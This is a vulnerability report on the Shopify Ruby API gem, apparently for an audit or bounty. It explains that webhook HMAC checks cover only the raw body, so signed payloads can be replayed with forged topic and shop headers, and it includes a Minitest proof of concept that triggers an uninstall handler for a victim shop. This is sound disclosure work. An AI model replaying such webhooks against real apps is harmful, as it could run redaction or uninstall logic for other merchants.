### Title
`Webhooks::Request#topic` and `#shop` are excluded from `to_signable_string`, allowing HMAC-valid webhooks to be replayed with forged topic/shop headers - (File: `lib/shopify_api/webhooks/request.rb`)

### Summary
`ShopifyAPI::Webhooks::Request#to_signable_string` returns only `@raw_body` [1](#0-0) , while `Registry.process` selects the handler and constructs the dispatched `WebhookMetadata` using the unsigned `X-Shopify-Topic` and `X-Shopify-Shop-Domain` headers [2](#0-1) . Because `HmacValidator.validate` only recomputes the HMAC over `to_signable_string` (the raw body) [3](#0-2) , an attacker who owns a genuine, validly-signed body/hmac pair for their own shop can replay it to the app's webhook endpoint with the `topic` and/or `shop` headers swapped to arbitrary values, and the signature check still passes.

### Finding Description
The binding the gem must uphold is: `hmac == HMAC(secret, raw_body || topic || shop)` such that any header the app trusts for authorization/routing is cryptographically bound to the signature. In this implementation the binding actually enforced is only `hmac == HMAC(secret, raw_body)`.

Trace:
- `Request#hmac` reads the `hmac-sha256` header [4](#0-3) .
- `Request#topic` and `Request#shop` read the `topic` and `shop-domain` headers respectively, with no cryptographic tie to the body [5](#0-4) .
- `Request#to_signable_string` returns `@raw_body` only [1](#0-0) .
- `HmacValidator.validate_signature` computes the signature purely from `to_signable_string` and compares to the `hmac` header via `OpenSSL.secure_compare` [3](#0-2) .
- `Registry.process` calls `HmacValidator.validate(request)`, then looks up `@registry[request.topic]&.handler` and calls `handler.handle(data: WebhookMetadata.new(topic: request.topic, shop: request.shop, body: request.parsed_body, ...))` [2](#0-1) .

Exploit flow: the attacker creates their own development shop, installs the app, and lets the app receive a genuine webhook (e.g., `orders/create`) with body `B` and a valid `hmac`. The attacker then POSTs directly to the app's webhook endpoint with the same raw bytes `B` and the same `hmac` header, but sets `X-Shopify-Topic: app/uninstall` (or `shop/redact`) and/or `X-Shopify-Shop-Domain: victim-shop.myshopify.com`. `HmacValidator.validate` still returns `true` because it never inspects `topic` or `shop`. `Registry.process` then dispatches to the handler registered for the attacker-chosen topic, and that handler receives an attacker-chosen `shop` value in `WebhookMetadata`, with body content that only had to be valid for the originally-issued topic.

No existing guard intercepts this: `HmacValidator.validate` checks only the body; there is no separate check binding `topic`/`shop` to the signature; `ShopValidator`/`Context.*` are unrelated to this code path since webhook processing does not go through OAuth/session/JWT verification at all.

### Impact Explanation
This lets a single attacker with a self-installed shop trigger any registered webhook handler (including mandatory ones like `app/uninstall`, `shop/redact`, `customers/redact`, `customers/data_request`) for an arbitrary target `shop` value, without ever having produced a signature over that topic or shop. If handlers trust `WebhookMetadata#shop` or `#topic` for authorization or tenant-scoping decisions (a very common pattern, since these are the two fields the gem itself exposes for that purpose), this is a cross-tenant trust bypass: one tenant's genuinely signed payload can be redirected to run high-privilege logic (uninstall, data redaction, or any handler) attributed to a different shop. This matches the Critical category ("authentication bypass ... cross-tenant access") because a webhook that was only ever authorized (signed) for topic/shop X is accepted and processed as topic/shop Y.

### Likelihood Explanation
Preconditions are cheap and fully within the described attacker capability: create a free development store, install the target app, receive one genuine webhook from Shopify (any topic that yields JSON body content acceptable to the target handler), and send one crafted HTTP POST directly to the app's public webhook endpoint with modified `topic`/`shop-domain` headers and the untouched body/hmac. No secret material, no privileged access, and no interaction with the victim is required. It is fully repeatable against any topic registered in `Registry` and, since `shop` is also unsigned, against any target shop value the attacker chooses to assert.

### Recommendation
Include `topic` and `shop` (and ideally `webhook_id`/`api_version`) in the signable string, or otherwise cryptographically bind them before dispatch — e.g., change `Request#to_signable_string` to incorporate the topic/shop headers, or have `Registry.process` verify that the topic/shop values used for dispatch are the same ones covered by the signature. Since Shopify's actual HMAC signature is computed by Shopify only over the raw body (this cannot be unilaterally changed by the gem to add more signed content while remaining compatible with Shopify's real signature), the safer compatible fix is for `Registry.process`/`WebhookHandler` documentation and implementation to require that any topic/shop-sensitive logic in a handler independently re-validate the shop against the session/store the app expects for that endpoint (e.g., look up the shop from `access_token`/install-state rather than trusting the header), and to route only via a per-endpoint-configured expected topic instead of trusting the caller-supplied header for dispatch.

### Proof of Concept
```ruby
# test/webhooks/registry_topic_confusion_test.rb
require "test_helper"

class RegistryTopicConfusionTest < Minitest::Test
  def setup
    ShopifyAPI::Context.setup(
      api_key: "key", api_secret_key: "secret", host_name: "app.com",
      scope: "read_products", is_embedded: false, is_private: false, api_version: "unstable"
    )
    ShopifyAPI::Webhooks::Registry.clear
  end

  def test_hmac_valid_regardless_of_topic_header
    raw_body = '{"id":123}'
    hmac = Base64.strict_encode64(
      OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), "secret", raw_body)
    )

    original = ShopifyAPI::Webhooks::Request.new(
      raw_body: raw_body,
      headers: { "x-shopify-topic" => "orders/create",
                 "x-shopify-hmac-sha256" => hmac,
                 "x-shopify-shop-domain" => "attacker.myshopify.com" }
    )
    forged = ShopifyAPI::Webhooks::Request.new(
      raw_body: raw_body,
      headers: { "x-shopify-topic" => "app/uninstall", # swapped topic, unsigned
                 "x-shopify-hmac-sha256" => hmac,       # same body/hmac
                 "x-shopify-shop-domain" => "victim.myshopify.com" } # swapped shop, unsigned
    )

    assert ShopifyAPI::Utils::HmacValidator.validate(original)
    # Signature over topic/shop was never computed, so a topic/shop swap still validates:
    assert ShopifyAPI::Utils::HmacValidator.validate(forged)

    ran_with = nil
    handler = Class.new do
      define_method(:handle) { |data:| ran_with = data }
    end.new

    ShopifyAPI::Webhooks::Registry.add_registration(
      topic: "app/uninstall", delivery_method: :http, path: "/webhooks", handler: handler
    )

    ShopifyAPI::Webhooks::Registry.process(forged)

    assert_equal "app/uninstall", ran_with.topic
    assert_equal "victim.myshopify.com", ran_with.shop # attacker-controlled, never signed
  end
end
```
This demonstrates both sides of the claimed binding are unequal: `hmac` remains valid (`true == true`) while `topic`/`shop` used for dispatch differ from what was actually signed, proving `topic`/`shop` are outside `to_signable_string`'s coverage.

### Citations

**File:** lib/shopify_api/webhooks/request.rb (L10-13)
```ruby
      sig { override.returns(String) }
      def hmac
        Digest.hexencode(Base64.decode64(T.cast(shopify_header("hmac-sha256"), String)))
      end
```

**File:** lib/shopify_api/webhooks/request.rb (L15-23)
```ruby
      sig { returns(String) }
      def topic
        T.cast(shopify_header("topic"), String)
      end

      sig { returns(String) }
      def shop
        T.cast(shopify_header("shop-domain"), String)
      end
```

**File:** lib/shopify_api/webhooks/request.rb (L35-38)
```ruby
      sig { override.returns(String) }
      def to_signable_string
        @raw_body
      end
```

**File:** lib/shopify_api/webhooks/registry.rb (L188-199)
```ruby
        sig { params(request: Request).void }
        def process(request)
          raise Errors::InvalidWebhookError, "Invalid webhook HMAC." unless Utils::HmacValidator.validate(request)

          handler = @registry[request.topic]&.handler

          unless handler
            raise Errors::NoWebhookHandler, "No webhook handler found for topic: #{request.topic}."
          end

          handler.handle(data: WebhookMetadata.new(topic: request.topic, shop: request.shop,
            body: request.parsed_body, api_version: request.api_version, webhook_id: request.webhook_id))
```

**File:** lib/shopify_api/utils/hmac_validator.rb (L26-31)
```ruby
        sig { params(verifiable_query: VerifiableQuery, secret: String).returns(T::Boolean) }
        def validate_signature(verifiable_query, secret)
          received_signature = verifiable_query.hmac
          computed_signature = compute_signature(verifiable_query.to_signable_string, secret)
          OpenSSL.secure_compare(computed_signature, T.must(received_signature))
        end
```
